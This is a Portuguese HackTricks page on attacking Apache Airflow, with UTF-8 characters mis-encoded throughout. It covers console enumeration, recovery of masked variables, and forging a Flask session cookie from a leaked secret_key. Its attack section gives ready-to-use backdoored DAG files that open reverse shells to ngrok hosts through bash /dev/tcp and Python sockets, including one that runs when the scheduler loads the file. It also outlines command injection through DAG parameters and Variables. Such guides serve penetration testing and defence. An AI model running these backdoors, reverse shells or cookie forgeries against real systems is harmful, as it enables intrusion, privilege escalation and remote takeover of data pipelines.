# Seguran√ßa do Apache Airflow

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informa√ß√µes B√°sicas

[**Apache Airflow**](https://airflow.apache.org) serve como uma plataforma para **orquestrar e agendar pipelines de dados ou fluxos de trabalho**. O termo "orquestra√ß√£o" no contexto de pipelines de dados significa o processo de organizar, coordenar e gerenciar fluxos de trabalho de dados complexos originados de v√°rias fontes. O objetivo principal desses pipelines de dados orquestrados √© fornecer conjuntos de dados processados e consum√≠veis. Esses conjuntos de dados s√£o amplamente utilizados por uma mir√≠ade de aplica√ß√µes, incluindo, mas n√£o se limitando a, ferramentas de intelig√™ncia de neg√≥cios, ci√™ncia de dados e modelos de aprendizado de m√°quina, todos fundamentais para o funcionamento de aplica√ß√µes de big data.

Basicamente, o Apache Airflow permitir√° que voc√™ **agende a execu√ß√£o de c√≥digo quando algo** (evento, cron) **acontecer**.

## Laborat√≥rio Local

### Docker-Compose

Voc√™ pode usar o **arquivo de configura√ß√£o docker-compose de** [**https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml**](https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml) para lan√ßar um ambiente docker apache airflow completo. (Se voc√™ estiver no MacOS, certifique-se de dar pelo menos 6GB de RAM para a VM do docker).

### Minikube

Uma maneira f√°cil de **executar o apache airflow** √© rod√°-lo **com minikube**:
```bash
helm repo add airflow-stable https://airflow-helm.github.io/charts
helm repo update
helm install airflow-release airflow-stable/airflow
# Some information about how to aceess the web console will appear after this command

# Use this command to delete it
helm delete airflow-release
```
## Configura√ß√£o do Airflow

O Airflow pode armazenar **informa√ß√µes sens√≠veis** em sua configura√ß√£o ou voc√™ pode encontrar configura√ß√µes fracas em vigor:

{% content-ref url="airflow-configuration.md" %}
[airflow-configuration.md](airflow-configuration.md)
{% endcontent-ref %}

## RBAC do Airflow

Antes de come√ßar a atacar o Airflow, voc√™ deve entender **como as permiss√µes funcionam**:

{% content-ref url="airflow-rbac.md" %}
[airflow-rbac.md](airflow-rbac.md)
{% endcontent-ref %}

## Ataques

### Enumera√ß√£o da Console Web

Se voc√™ tem **acesso √† console web**, voc√™ pode ser capaz de acessar algumas ou todas as seguintes informa√ß√µes:

* **Vari√°veis** (Informa√ß√µes sens√≠veis personalizadas podem ser armazenadas aqui)
* **Conex√µes** (Informa√ß√µes sens√≠veis personalizadas podem ser armazenadas aqui)
* Acesse-as em `http://<airflow>/connection/list/`
* [**Configura√ß√£o**](./#airflow-configuration) (Informa√ß√µes sens√≠veis como a **`secret_key`** e senhas podem ser armazenadas aqui)
* Listar **usu√°rios & pap√©is**
* **C√≥digo de cada DAG** (que pode conter informa√ß√µes interessantes)

### Recuperar Valores de Vari√°veis

Vari√°veis podem ser armazenadas no Airflow para que os **DAGs** possam **acessar** seus valores. √â semelhante a segredos de outras plataformas. Se voc√™ tem **permiss√µes suficientes**, voc√™ pode acess√°-las na GUI em `http://<airflow>/variable/list/`.\
Por padr√£o, o Airflow mostrar√° o valor da vari√°vel na GUI, no entanto, de acordo com [**isto**](https://marclamberti.com/blog/variables-with-apache-airflow/), √© poss√≠vel definir uma **lista de vari√°veis** cujo **valor** aparecer√° como **asteriscos** na **GUI**.

![](<../../.gitbook/assets/image (79).png>)

No entanto, esses **valores** ainda podem ser **recuperados** via **CLI** (voc√™ precisa ter acesso ao DB), **execu√ß√£o de DAG arbitr√°ria**, **API** acessando o endpoint de vari√°veis (a API precisa ser ativada), e **at√© mesmo a pr√≥pria GUI!**\
Para acessar esses valores da GUI, basta **selecionar as vari√°veis** que deseja acessar e **clicar em A√ß√µes -> Exportar**.\
Outra maneira √© realizar um **bruteforce** ao **valor oculto** usando o **filtro de pesquisa** at√© obt√™-lo:

![](<../../.gitbook/assets/image (30).png>)

### Escalonamento de Privil√©gios

Se a configura√ß√£o **`expose_config`** estiver definida como **True**, a partir do **papel de Usu√°rio** para cima, pode-se **ler** a **configura√ß√£o na web**. Nesta configura√ß√£o, a **`secret_key`** aparece, o que significa que qualquer usu√°rio com este valor v√°lido pode **criar seu pr√≥prio cookie assinado para se passar por qualquer outra conta de usu√°rio**.
```bash
flask-unsign --sign --secret '<secret_key>' --cookie "{'_fresh': True, '_id': '12345581593cf26619776d0a1e430c412171f4d12a58d30bef3b2dd379fc8b3715f2bd526eb00497fcad5e270370d269289b65720f5b30a39e5598dad6412345', '_permanent': True, 'csrf_token': '09dd9e7212e6874b104aad957bbf8072616b8fbc', 'dag_status_filter': 'all', 'locale': 'en', 'user_id': '1'}"
```
### Backdoor em DAG (RCE no worker do Airflow)

Se voc√™ tem **acesso de escrita** ao local onde os **DAGs s√£o salvos**, voc√™ pode simplesmente **criar um** que enviar√° para voc√™ um **reverse shell.**\
Observe que esse reverse shell ser√° executado dentro de um **container do worker do airflow**:
```python
import pendulum
from airflow import DAG
from airflow.operators.bash import BashOperator

with DAG(
dag_id='rev_shell_bash',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = BashOperator(
task_id='run',
bash_command='bash -i >& /dev/tcp/8.tcp.ngrok.io/11433  0>&1',
)
```

```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

with DAG(
dag_id='rev_shell_python',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python',
python_callable=rs,
op_kwargs={"rhost":"8.tcp.ngrok.io", "port": 11433}
)
```
### Backdoor em DAG (RCE no agendador do Airflow)

Se voc√™ configurar algo para ser **executado na raiz do c√≥digo**, no momento em que isto √© escrito, ser√° **executado pelo agendador** alguns segundos ap√≥s ser colocado dentro da pasta dos DAGs.
```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

rs("2.tcp.ngrok.io", 14403)

with DAG(
dag_id='rev_shell_python2',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python2',
python_callable=rs,
op_kwargs={"rhost":"2.tcp.ngrok.io", "port": 144}
```
### Cria√ß√£o de DAG

Se voc√™ conseguir **comprometer uma m√°quina dentro do cluster DAG**, voc√™ pode criar novos **scripts DAGs** na pasta `dags/` e eles ser√£o **replicados no restante das m√°quinas** dentro do cluster DAG.

### Inje√ß√£o de C√≥digo em DAG

Quando voc√™ executa um DAG pela GUI, voc√™ pode **passar argumentos** para ele.\
Portanto, se o DAG n√£o for codificado corretamente, ele pode ser **vulner√°vel a Inje√ß√£o de Comando.**\
Foi o que aconteceu neste CVE: [https://www.exploit-db.com/exploits/49927](https://www.exploit-db.com/exploits/49927)

Tudo o que voc√™ precisa saber para **come√ßar a procurar por inje√ß√µes de comando em DAGs** √© que os **par√¢metros** s√£o **acessados** com o c√≥digo **`dag_run.conf.get("param_name")`**.

Al√©m disso, a mesma vulnerabilidade pode ocorrer com **vari√°veis** (note que com privil√©gios suficientes voc√™ poderia **controlar o valor das vari√°veis** na GUI). Vari√°veis s√£o **acessadas com**:
```python
from airflow.models import Variable
[...]
foo = Variable.get("foo")
```
Se forem usados, por exemplo, dentro de um comando bash, voc√™ poderia realizar uma inje√ß√£o de comando.

<details>

<summary><strong>Aprenda hacking em AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
